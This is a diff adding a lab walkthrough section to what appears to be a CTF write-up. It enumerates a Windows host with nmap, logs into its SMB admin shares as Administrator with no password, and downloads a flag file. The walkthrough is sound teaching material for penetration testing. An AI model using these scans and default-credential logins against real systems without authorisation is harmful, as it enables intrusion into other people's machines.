@@ -2922,3 +2922,359 @@ We can now grab our thirteenth flag!
 Using nmap, we were able to discover the host had a web server open on port 8080. We then we able to brute force the login credentials using the default Jenkins username/password. Finally, we were able to perform a reverse shell exploit using a groovy script inside the web console in order to get root access to the machine.
  
 [Table of Contents](#table-of-contents) 
+
+
+
+## Level 8: Tactics
+
+### Scope
+
+The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:
+
+| # | 	Description 	| Value |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	IP Address   |    	10.129.56.216   | 
+
+### Enumeration
+
+Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.
+
+First we can try to see if we can make contact with the machine with a ping request.
+
+```
+ping {ip address}
+```
+The results from the ping are:
+
+```
+└─$ ping 10.129.56.216
+
+PING 10.129.56.216 (10.129.56.216) 56(84) bytes of data.
+64 bytes from 10.129.56.216: icmp_seq=1 ttl=127 time=11.4 ms
+64 bytes from 10.129.56.216: icmp_seq=2 ttl=127 time=9.99 ms
+64 bytes from 10.129.56.216: icmp_seq=3 ttl=127 time=8.61 ms
+64 bytes from 10.129.56.216: icmp_seq=4 ttl=127 time=7.48 ms
+
+--- 10.129.56.216 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3004ms
+rtt min/avg/max/mdev = 7.480/9.374/11.413/1.475 ms
+
+```
+As we can see, we made a connection with the host. 
+
+Next, we can try using nmap to see if there are any ports that can be exploited.
+
+```
+nmap -p- --min-rate 3000 -sC -sV {ip address}
+```
+
+Where:
+
+```
+-p-: scans ALL ports
+--min-rate <number>: Send packets no slower than <number> per second
+-sC: equivalent to --script=default
+-sV: probe open ports to determine service/version info
+-O: operating system information
+```
+The results of nmap are:
+
+```
+└─$ sudo nmap -p- --min-rate 3000 -sC -sV -O  10.129.56.216
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-27 15:16 EDT
+Nmap scan report for 10.129.56.216
+Host is up (0.0094s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+| smb2-time: 
+|   date: 2022-07-27T19:17:07
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.99 seconds
+
+```
+Our scan shows quite a few ports the can be explored. One of the more interesting ones is port ```445```, which is reserved for Sever Message Block (SMB) as we have seen in a previous box.
+
+We can start by trying to establish connection using smbclient:
+
+```
+smbclient -L {ip address}
+```
+ 
+The results of using smbclient are:
+
+```
+└─$ smbclient -L 10.129.56.216 
+                       
+Password for [WORKGROUP\kali]:
+session setup failed: NT_STATUS_ACCESS_DENIED
+
+
+```
+Unfortunately, this failed. We can try to see if there is an Administrator credential:
+
+```
+└─$ smbclient -L 10.129.56.216 -U 'Administrator'
+
+Password for [WORKGROUP\Administrator]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.56.216 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+```
+We can see here all of the visible share names listed. A great starting point is to try to connect with each of these shares.
+
+Starting with ```ADMIN$```:
+
+```
+└─$ smbclient \\\\10.129.56.216\\ADMIN$ -U 'Administrator'
+
+Password for [WORKGROUP\Administrator]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Jul 27 15:46:28 2022
+  ..                                  D        0  Wed Jul 27 15:46:28 2022
+  $Reconfig$                          D        0  Mon Sep 20 12:02:49 2021
+  ADFS                                D        0  Sat Sep 15 03:19:03 2018
+  appcompat                           D        0  Sat Sep 15 03:19:00 2018
+  apppatch                            D        0  Mon Oct 29 18:39:47 2018
+  AppReadiness                        D        0  Wed Apr 21 11:39:36 2021
+  assembly                           DR        0  Sat Sep 15 05:09:13 2018
+  bcastdvr                            D        0  Sat Sep 15 03:19:00 2018
+  bfsvc.exe                           A    78848  Sat Sep 15 03:12:58 2018
+  Boot                                D        0  Sat Sep 15 03:19:01 2018
+  bootstat.dat                       AS    67584  Wed Jul 27 15:05:35 2022
+  Branding                            D        0  Sat Sep 15 03:19:01 2018
+  CbsTemp                             D        0  Wed Jul  7 14:00:03 2021
+  Containers                          D        0  Sat Sep 15 03:19:01 2018
+  Cursors                             D        0  Sat Sep 15 03:19:04 2018
+  debug                               D        0  Wed Apr 21 11:17:15 2021
+  diagnostics                         D        0  Sat Sep 15 03:19:01 2018
+  DigitalLocker                       D        0  Sat Sep 15 05:05:40 2018
+  Downloaded Program Files           DS        0  Sat Sep 15 03:19:04 2018
+  drivers                             D        0  Sat Sep 15 03:19:01 2018
+  DtcInstall.log                      A     1947  Wed Apr 21 11:16:44 2021
+  ELAMBKUP                           DH        0  Sat Sep 15 03:19:04 2018
+  en-US                               D        0  Sat Sep 15 05:05:40 2018
+  explorer.exe                        A  4245280  Mon Oct 29 18:39:24 2018
+  Fonts                             DSR        0  Sat Sep 15 03:19:04 2018
+  Globalization                       D        0  Sat Sep 15 03:19:01 2018
+  Help                                D        0  Sat Sep 15 05:05:40 2018
+  HelpPane.exe                        A  1065472  Sat Sep 15 03:12:46 2018
+  hh.exe                              A    18432  Sat Sep 15 03:12:48 2018
+  IdentityCRL                         D        0  Sat Sep 15 03:19:04 2018
+  IME                                 D        0  Sat Sep 15 05:05:40 2018
+  ImmersiveControlPanel              DR        0  Wed Apr 21 11:16:42 2021
+  INF                                 D        0  Wed Jul 27 14:59:14 2022
+  InputMethod                         D        0  Sat Sep 15 03:19:01 2018
+  Installer                         DHS        0  Wed Jul  7 14:05:00 2021
+  L2Schemas                           D        0  Sat Sep 15 03:19:04 2018
+  LiveKernelReports                   D        0  Sat Sep 15 03:19:01 2018
+  Logs                                D        0  Tue Sep 21 12:33:25 2021
+  lsasetup.log                        A     1380  Wed Apr 21 11:16:02 2021
+  media                             DSR        0  Sat Sep 15 03:19:04 2018
+  mib.bin                             A    43131  Sat Sep 15 03:12:40 2018
+  Microsoft.NET                      DR        0  Wed Jul 27 15:05:14 2022
+  Migration                           D        0  Sat Sep 15 03:19:01 2018
+  ModemLogs                           D        0  Sat Sep 15 03:19:01 2018
+  notepad.exe                         A   254464  Sat Sep 15 03:12:38 2018
+  OCR                                 D        0  Sat Sep 15 05:07:04 2018
+  Offline Web Pages                  DR        0  Sat Sep 15 03:19:05 2018
+  Panther                             D        0  Wed Apr 21 11:16:50 2021
+  Performance                         D        0  Sat Sep 15 03:19:01 2018
+  PFRO.log                            A     1708  Mon Sep 27 06:26:45 2021
+  PLA                                 D        0  Sat Sep 15 03:19:01 2018
+  PolicyDefinitions                   D        0  Sat Sep 15 05:08:05 2018
+  Prefetch                           Dn        0  Wed Apr 21 11:16:20 2021
+  PrintDialog                        DR        0  Wed Apr 21 11:16:43 2021
+  Provisioning                        D        0  Sat Sep 15 03:19:01 2018
+  regedit.exe                         A   358400  Sat Sep 15 03:12:52 2018
+  Registration                        D        0  Wed Jul 27 14:55:07 2022
+  RemotePackages                      D        0  Sat Sep 15 03:19:01 2018
+  rescache                            D        0  Sat Sep 15 03:19:01 2018
+  Resources                           D        0  Sat Sep 15 03:19:01 2018
+  SchCache                            D        0  Sat Sep 15 03:19:01 2018
+  schemas                             D        0  Sat Sep 15 03:19:01 2018
+  security                            D        0  Sat Sep 15 03:19:01 2018
+  ServerStandard.xml                  A    30931  Sat Sep 15 03:13:27 2018
+  ServiceProfiles                     D        0  Wed Apr 21 11:16:04 2021
+  ServiceState                        D        0  Sat Sep 15 03:19:01 2018
+  servicing                           D        0  Sat Sep 15 05:06:36 2018
+  Setup                               D        0  Sat Sep 15 03:21:38 2018
+  ShellComponents                     D        0  Sat Sep 15 03:19:05 2018
+  ShellExperiences                    D        0  Sat Sep 15 03:19:05 2018
+  SKB                                 D        0  Sat Sep 15 03:19:01 2018
+  SoftwareDistribution                D        0  Wed Apr 21 11:23:54 2021
+  Speech                              D        0  Sat Sep 15 03:19:01 2018
+  Speech_OneCore                      D        0  Sat Sep 15 03:19:01 2018
+  splwow64.exe                        A   132096  Sat Sep 15 03:13:30 2018
+  System                              D        0  Sat Sep 15 03:19:01 2018
+  system.ini                          A      219  Sat Sep 15 03:16:48 2018
+  System32                            D        0  Wed Jul 27 14:59:14 2022
+  SystemApps                          D        0  Sat Sep 15 03:19:01 2018
+  SystemResources                     D        0  Sat Sep 15 03:19:01 2018
+  SysWOW64                            D        0  Wed Jul  7 14:04:43 2021
+  TAPI                                D        0  Tue Sep 21 12:51:49 2021
+  Tasks                               D        0  Wed Apr 21 11:16:18 2021
+  Temp                                D        0  Wed Jul 27 15:46:28 2022
+  TextInput                           D        0  Sat Sep 15 03:19:14 2018
+  tracing                             D        0  Sat Sep 15 03:19:01 2018
+  twain_32                            D        0  Sat Sep 15 03:19:14 2018
+  twain_32.dll                        A    64512  Sat Sep 15 03:13:11 2018
+  Vss                                 D        0  Sat Sep 15 03:19:01 2018
+  WaaS                                D        0  Sat Sep 15 03:19:01 2018
+  Web                                 D        0  Sat Sep 15 03:19:01 2018
+  win.ini                             A       92  Sat Sep 15 03:16:48 2018
+  WindowsShell.Manifest             AHR      670  Sat Sep 15 03:12:40 2018
+  WindowsUpdate.log                   A      276  Wed Jul 27 14:55:14 2022
+  winhlp32.exe                        A    11776  Sat Sep 15 03:13:11 2018
+  WinSxS                              D        0  Wed Jul  7 13:46:29 2021
+  WMSysPr9.prx                        A   316640  Sat Sep 15 03:12:02 2018
+  write.exe                           A    11264  Sat Sep 15 03:12:55 2018
+
+                3774463 blocks of size 4096. 1159050 blocks available
+smb: \> 
+
+
+```
+We see here mostly system files, however no flag is found.
+
+Trying the remaining shares:
+
+```
+└─$ smbclient \\\\10.129.56.216\\C$ -U 'Administrator'
+
+Password for [WORKGROUP\Administrator]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  $Recycle.Bin                      DHS        0  Wed Apr 21 11:23:49 2021
+  Config.Msi                        DHS        0  Wed Jul  7 14:04:56 2021
+  Documents and Settings          DHSrn        0  Wed Apr 21 11:17:12 2021
+  pagefile.sys                      AHS 738197504  Wed Jul 27 14:55:02 2022
+  PerfLogs                            D        0  Sat Sep 15 03:19:00 2018
+  Program Files                      DR        0  Wed Jul  7 14:04:24 2021
+  Program Files (x86)                 D        0  Wed Jul  7 14:03:38 2021
+  ProgramData                        DH        0  Wed Apr 21 11:31:48 2021
+  Recovery                         DHSn        0  Wed Apr 21 11:17:15 2021
+  System Volume Information         DHS        0  Wed Apr 21 11:34:04 2021
+  Users                              DR        0  Wed Apr 21 11:23:18 2021
+  Windows                             D        0  Wed Jul 27 15:46:28 2022
+
+                3774463 blocks of size 4096. 1159034 blocks available
+smb: \> 
+
+```
+
+We can try to browse the local directory.
+
+```
+└smb: \> cd Users
+
+smb: \Users\> ls
+  .                                  DR        0  Wed Apr 21 11:23:18 2021
+  ..                                 DR        0  Wed Apr 21 11:23:18 2021
+  Administrator                       D        0  Wed Apr 21 11:23:32 2021
+  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
+  Default                           DHR        0  Wed Apr 21 11:17:12 2021
+  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
+  Public                             DR        0  Wed Apr 21 11:23:31 2021
+
+                3774463 blocks of size 4096. 1159034 blocks available
+
+smb: \Users\> cd Administrator
+
+smb: \Users\Administrator\> ls
+  .                                   D        0  Wed Apr 21 11:23:32 2021
+  ..                                  D        0  Wed Apr 21 11:23:32 2021
+  3D Objects                         DR        0  Wed Apr 21 11:23:31 2021
+  AppData                            DH        0  Wed Apr 21 11:23:19 2021
+  Application Data                DHSrn        0  Wed Apr 21 11:23:19 2021
+  Contacts                           DR        0  Wed Apr 21 11:23:31 2021
+  Cookies                         DHSrn        0  Wed Apr 21 11:23:19 2021
+  Desktop                            DR        0  Thu Apr 22 03:16:03 2021
+  Documents                          DR        0  Wed Apr 21 11:23:32 2021
+  Downloads                          DR        0  Wed Jul  7 13:44:36 2021
+  Favorites                          DR        0  Wed Apr 21 11:23:31 2021
+  Links                              DR        0  Wed Apr 21 11:23:32 2021
+  Local Settings                  DHSrn        0  Wed Apr 21 11:23:19 2021
+  Music                              DR        0  Wed Apr 21 11:23:32 2021
+  My Documents                    DHSrn        0  Wed Apr 21 11:23:19 2021
+  NetHood                         DHSrn        0  Wed Apr 21 11:23:19 2021
+  NTUSER.DAT                        AHn   786432  Mon Sep 27 06:38:14 2021
+  ntuser.dat.LOG1                   AHS   238592  Wed Apr 21 11:23:18 2021
+  ntuser.dat.LOG2                   AHS    98304  Wed Apr 21 11:23:18 2021
+  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Wed Apr 21 05:03:39 2021
+  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Wed Apr 21 11:23:19 2021
+  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Wed Apr 21 11:23:19 2021
+  ntuser.ini                         HS       20  Wed Apr 21 11:23:19 2021
+  Pictures                           DR        0  Wed Apr 21 11:23:31 2021
+  PrintHood                       DHSrn        0  Wed Apr 21 11:23:19 2021
+  Recent                          DHSrn        0  Wed Apr 21 11:23:19 2021
+  Saved Games                        DR        0  Wed Apr 21 11:23:32 2021
+  Searches                           DR        0  Wed Apr 21 11:23:32 2021
+  SendTo                          DHSrn        0  Wed Apr 21 11:23:19 2021
+  Start Menu                      DHSrn        0  Wed Apr 21 11:23:19 2021
+  Templates                       DHSrn        0  Wed Apr 21 11:23:19 2021
+  Videos                             DR        0  Wed Apr 21 11:23:31 2021
+
+                3774463 blocks of size 4096. 1159018 blocks available
+smb: \Users\Administrator\> cd Desktop
+smb: \Users\Administrator\Desktop\> ls
+  .                                  DR        0  Thu Apr 22 03:16:03 2021
+  ..                                 DR        0  Thu Apr 22 03:16:03 2021
+  desktop.ini                       AHS      282  Wed Apr 21 11:23:32 2021
+  flag.txt                            A       32  Fri Apr 23 05:39:00 2021
+
+                3774463 blocks of size 4096. 1159002 blocks available
+
+```
+
+We can see here were found our fourteenth flag!
+
+Here we can first download, then open it.
+
+```
+smb: \Users\Administrator\Desktop\> get flag.txt
+
+getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+
+└─$ cat flag.txt               
+f751c19eda8f61ce81827e6930a1f40c  
+
+```
+## Conclusions - Level 8 Tactics
+
+| # | 	Tools 	| Description |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
+
+| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
+| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
+| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
+
+Using nmap, we were able to discover the host was running an SMB on port 445. Logging in, we were then able to get access to the service, a consequence of the server administrator having poorly configured the login credentials.
+
+
+[Table of Contents](#table-of-contents)
